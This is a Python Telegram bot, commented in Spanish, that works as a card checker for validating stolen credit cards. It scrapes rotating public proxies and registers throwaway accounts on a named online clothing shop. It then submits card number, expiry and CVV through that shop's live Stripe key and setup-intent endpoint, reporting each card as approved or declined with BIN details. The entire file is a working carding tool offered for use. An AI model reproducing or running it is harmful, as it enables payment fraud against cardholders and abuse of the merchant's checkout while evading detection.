from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
import requests
import re
import random
import string
import logging
import os
import sys
import time
from datetime import datetime, timedelta

# ============ CONFIGURACIÓN ============
TOKEN = os.getenv("TOKEN")

if not TOKEN:
    print("❌ ERROR: No se encontró el token.")
    sys.exit(1)

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ============ CONFIGURACIÓN DE PROXIES ============
PROXY_CACHE = []  # Caché de proxies funcionales
LAST_UPDATE = None
UPDATE_INTERVAL = 10  # Minutos entre actualizaciones

# URLs de repositorios GitHub con listas de proxies
PROXY_SOURCES = [
    "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
    "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt",
    "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
    "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
]

def scrape_proxies():
    """Scrapea proxies de múltiples fuentes de GitHub"""
    global PROXY_CACHE, LAST_UPDATE
    
    # Verificar si necesitamos actualizar
    if LAST_UPDATE and datetime.now() - LAST_UPDATE < timedelta(minutes=UPDATE_INTERVAL):
        return PROXY_CACHE
    
    logger.info("🔄 Actualizando lista de proxies...")
    new_proxies = []
    
    for url in PROXY_SOURCES:
        try:
            response = requests.get(url, timeout=10, headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            })
            
            if response.status_code == 200:
                # Extraer IPs:puerto del contenido
                lines = response.text.strip().split('\n')
                for line in lines:
                    line = line.strip()
                    # Validar formato IP:PUERTO
                    if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{2,5}$', line):
                        new_proxies.append(line)
                        
        except Exception as e:
            logger.warning(f"Error scrapeando {url}: {e}")
    
    # Eliminar duplicados y mezclar
    PROXY_CACHE = list(set(new_proxies))
    random.shuffle(PROXY_CACHE)
    LAST_UPDATE = datetime.now()
    
    logger.info(f"✅ Se encontraron {len(PROXY_CACHE)} proxies únicos")
    return PROXY_CACHE

def get_working_proxy(max_attempts=5):
    """Obtiene un proxy funcional probando varios"""
    proxies = scrape_proxies()
    
    if not proxies:
        logger.warning("No se encontraron proxies")
        return None
    
    # Probar proxies hasta encontrar uno funcional
    for _ in range(min(max_attempts, len(proxies))):
        proxy = random.choice(proxies)
        
        # Determinar tipo de proxy
        if proxy in [p for p in proxies if 'socks' in str(PROXY_SOURCES).lower()]:
            proxy_url = f"socks5://{proxy}"
        else:
            proxy_url = f"http://{proxy}"
        
        proxies_dict = {
            "http": proxy_url,
            "https": proxy_url
        }
        
        # Probar el proxy
        try:
            test_response = requests.get(
                "http://httpbin.org/ip",
                proxies=proxies_dict,
                timeout=5
            )
            if test_response.status_code == 200:
                logger.info(f"✅ Proxy funcional: {proxy}")
                return proxies_dict
        except:
            continue
    
    logger.warning("No se encontraron proxies funcionales")
    return None

def get_session():
    """Crea una sesión con proxy aleatorio"""
    session = requests.Session()
    
    # Obtener proxy funcional
    proxy = get_working_proxy()
    if proxy:
        session.proxies.update(proxy)
        logger.info(f"Usando proxy: {list(proxy.values())[0]}")
    else:
        logger.warning("⚠️ Ejecutando sin proxy")
    
    session.headers.update({
        'User-Agent': random.choice([
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
        ]),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
    })
    return session

def create_stripe_payment_method(session, cc, mm, yy, cvv, email):
    stripe_headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://www.dastaar.clothing',
        'Referer': 'https://www.dastaar.clothing/',
        'Accept': 'application/json',
    }
    
    stripe_data = {
        'type': 'card',
        'card[number]': cc,
        'card[cvc]': cvv,
        'card[exp_year]': yy,
        'card[exp_month]': mm,
        'billing_details[address][country]': 'GB',
        'billing_details[email]': email,
        'key': 'pk_live_51J5VJqJUS8a0f77QZRGgjVtzj3NQo2p6rR0uZED6uNM0CYUkjF7kzPNpC0JtBBXGUp85ywCyL1ZUyvYwG5n5SdGP00KFhl4XmO',
        '_stripe_account': 'acct_1J5VJqJUS8a0f77Q',
        'payment_user_agent': 'stripe.js/af71287371; stripe-js-v3/af71287371',
        'referrer': 'https://www.dastaar.clothing'
    }
    
    try:
        response = session.post(
            'https://api.stripe.com/v1/payment_methods',
            data=stripe_data,
            headers=stripe_headers,
            timeout=30
        )
        return response
    except requests.exceptions.ProxyError as e:
        logger.error(f"Error de proxy: {e}")
        return None
    except Exception as e:
        logger.error(f"Error en request: {e}")
        return None

def auth_check(session, payment_method_id, nonce):
    setup_data = {
        'action': 'create_and_confirm_setup_intent',
        'wc-stripe-payment-method': payment_method_id,
        'wc-stripe-payment-type': 'card',
        '_ajax_nonce': nonce,
    }
    
    try:
        response = session.post(
            'https://www.dastaar.clothing/?wc-ajax=wc_stripe_create_and_confirm_setup_intent',
            data=setup_data,
            headers={'X-Requested-With': 'XMLHttpRequest', 'Origin': 'https://www.dastaar.clothing'},
            timeout=30
        )
        return response.json()
    except Exception as e:
        logger.error(f"Error en auth_check: {e}")
        return {}

def get_bin_info(bin_number):
    try:
        response = requests.get(f'https://bins.antipublic.cc/bins/{bin_number}', timeout=5)
        return response.json() if response.status_code == 200 else {}
    except Exception:
        return {}

def check_card_stripe(cc, mm, yy, cvv):
    """Verificación de tarjeta con proxy rotativo"""
    session = get_session()
    
    if len(yy) == 4:
        yy = yy[-2:]

    try:
        random_email = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12)) + '@gmail.com'
        
        # Crear cuenta
        try:
            login_page = session.get('https://www.dastaar.clothing/my-account/', timeout=15)
            nonce_match = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', login_page.text)
            
            if nonce_match:
                register_data = {
                    'email': random_email,
                    'password': 'Password123!',
                    'woocommerce-register-nonce': nonce_match.group(1),
                    '_wp_http_referer': '/my-account/',
                    'register': 'Register'
                }
                session.post('https://www.dastaar.clothing/my-account/', data=register_data, timeout=15)
        except Exception as e:
            logger.warning(f"Error en login: {e}")
        
        # Crear método de pago
        stripe_response = create_stripe_payment_method(session, cc, mm, yy, cvv, random_email)
        
        if stripe_response is None:
            return {
                "status": "Declined",
                "response": "Proxy connection failed",
                "decline_type": "proxy_error",
                "bin_info": get_bin_info(cc[:6])
            }
        
        if stripe_response.status_code != 200:
            error = stripe_response.json().get('error', {})
            return {
                "status": "Declined",
                "response": error.get('message', 'Card declined'),
                "decline_type": "card_decline",
                "bin_info": get_bin_info(cc[:6])
            }
        
        payment_method_id = stripe_response.json().get('id')
        
        # Obtener nonce
        try:
            payment_page = session.get('https://www.dastaar.clothing/my-account/payment-methods/', timeout=15)
            nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', payment_page.text)
        except Exception as e:
            logger.warning(f"Error obteniendo nonce: {e}")
            nonce_match = None
        
        if not nonce_match:
            return {
                "status": "Declined",
                "response": "Failed to get nonce",
                "decline_type": "process_error",
                "bin_info": get_bin_info(cc[:6])
            }
        
        # Auth check
        result = auth_check(session, payment_method_id, nonce_match.group(1))
        
        if result.get('success') or result.get('status') == 'succeeded':
            return {
                "status": "Approved",
                "response": "Auth successful",
                "decline_type": "none",
                "bin_info": get_bin_info(cc[:6])
            }
        else:
            return {
                "status": "Declined",
                "response": result.get('error', {}).get('message', 'Auth failed'),
                "decline_type": "card_decline",
                "bin_info": get_bin_info(cc[:6])
            }
                
    except Exception as e:
        logger.error(f"Error general: {e}")
        return {
            "status": "Declined",
            "response": f"Error: {str(e)}",
            "decline_type": "process_error",
            "bin_info": get_bin_info(cc[:6])
        }

# ============ COMANDOS DEL BOT ============

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    welcome_text = """
👋 *Bienvenido al Stripe Checker Bot*

*Comandos disponibles:*

🔍 `/chk 4548812049400004|12|25|123` 
   → Verificación de tarjeta (Auth)

📊 `/bin 454881`
   → Información del BIN

⚙️ `/proxies`
   → Ver cantidad de proxies disponibles

*Formato:* CC|MM|YY|CVV

🔄 Proxies auto-actualizados cada 10 minutos
    """
    await update.message.reply_text(welcome_text, parse_mode='Markdown')

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = """
*Guía de uso:*

1️⃣ *Verificar tarjeta:*
   `/chk 4548812049400004|12|25|123`

2️⃣ *Información BIN:*
   `/bin 454881`

3️⃣ *Ver proxies:*
   `/proxies`

*Formato:* `CC|MM|YY|CVV`

⚠️ *Nota:* Este bot usa proxies públicos rotativos.
    """
    await update.message.reply_text(help_text, parse_mode='Markdown')

async def proxies_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Muestra estadísticas de proxies"""
    count = len(PROXY_CACHE)
    last_update = LAST_UPDATE.strftime("%H:%M:%S") if LAST_UPDATE else "Nunca"
    
    text = f"""
🌐 *Estado de Proxies*

📊 *Disponibles:* `{count}`
🕐 *Última actualización:* `{last_update}`
⏱️ *Intervalo:* `10 minutos`

🔄 Los proxies se actualizan automáticamente.
    """
    await update.message.reply_text(text, parse_mode='Markdown')

async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text(
            "❌ *Error:* Proporciona los datos de la tarjeta\n\n"
            "Uso: `/chk 4548812049400004|12|25|123`",
            parse_mode='Markdown'
        )
        return
    
    card_input = context.args[0]
    
    match = re.match(r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})', card_input)
    if not match:
        await update.message.reply_text(
            "❌ *Formato inválido*\n\n"
            "Usa: `CC|MM|YY|CVV`\n"
            "Ejemplo: `4548812049400004|12|25|123`",
            parse_mode='Markdown'
        )
        return
    
    cc, mm, yy, cvv = match.groups()
    
    processing_msg = await update.message.reply_text(
        f"⏳ *Verificando...*\n"
        f"🌐 *Proxy:* Activado\n"
        f"💳 Card: `{cc[:6]}******{cc[-4:]}`\n"
        f"📅 Exp: `{mm}/{yy}`",
        parse_mode='Markdown'
    )
    
    result = check_card_stripe(cc, mm, yy, cvv)
    bin_info = result.get('bin_info', {})
    
    if result['status'] == 'Approved':
        status_emoji = "✅"
        status_text = "APPROVED"
    else:
        status_emoji = "❌"
        status_text = "DECLINED"
    
    response_text = f"""
{status_emoji} *{status_text}*

💳 *Card:* `{cc}`
📅 *Expiry:* `{mm}/{yy}`
🔒 *CVV:* `{cvv}`

🏦 *BIN Info:*
├ Brand: `{bin_info.get('brand', 'N/A')}`
├ Type: `{bin_info.get('type', 'N/A')}`
├ Level: `{bin_info.get('level', 'N/A')}`
├ Bank: `{bin_info.get('bank', 'N/A')}`
└ Country: `{bin_info.get('country_name', 'N/A')} {bin_info.get('country_flag', '')}`

📝 *Response:* `{result['response']}`
🔍 *Mode:* `Auth + Proxy`
    """
    
    await processing_msg.edit_text(response_text, parse_mode='Markdown')

async def bin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Uso: `/bin 454881`", parse_mode='Markdown')
        return
    
    bin_number = context.args[0][:6]
    bin_info = get_bin_info(bin_number)
    
    if not bin_info:
        await update.message.reply_text(f"❌ No se encontró información para el BIN `{bin_number}`", parse_mode='Markdown')
        return
    
    response_text = f"""
🏦 *BIN Information*

🔢 *BIN:* `{bin_number}`
🏷️ *Brand:* `{bin_info.get('brand', 'N/A')}`
💳 *Type:* `{bin_info.get('type', 'N/A')}`
⭐ *Level:* `{bin_info.get('level', 'N/A')}`
🏛️ *Bank:* `{bin_info.get('bank', 'N/A')}`
🌍 *Country:* `{bin_info.get('country_name', 'N/A')} {bin_info.get('country_flag', '')}`
    """
    
    await update.message.reply_text(response_text, parse_mode='Markdown')

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"Update {update} caused error {context.error}")
    if update and update.message:
        await update.message.reply_text("❌ Ocurrió un error. Intenta de nuevo.")

# ============ MAIN ============

def main():
    # Cargar proxies al inicio
    scrape_proxies()
    
    application = Application.builder().token(TOKEN).build()
    
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("chk", chk_command))
    application.add_handler(CommandHandler("bin", bin_command))
    application.add_handler(CommandHandler("proxies", proxies_command))
    
    application.add_error_handler(error_handler)
    
    print("🤖 Bot iniciado con scraping de proxies. Presiona Ctrl+C para detener.")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()